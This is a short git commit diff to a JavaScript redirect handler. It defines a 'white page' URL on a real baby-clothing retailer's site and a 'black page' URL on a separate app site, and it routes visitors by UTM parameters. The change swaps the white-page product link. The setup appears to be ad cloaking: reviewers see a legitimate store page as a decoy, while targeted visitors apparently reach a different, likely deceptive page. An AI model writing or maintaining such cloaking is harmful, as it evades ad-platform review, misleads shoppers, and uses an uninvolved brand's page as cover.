e9dbf9695ae55393644cbf97a4dcb2651b0273ea
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-07 20:42:26 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://purebaby.com.au/products/christmas-dress-celebration-broderie";
+    const whitePageURL = "https://purebaby.com.au/products/bow-headband-nachos";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
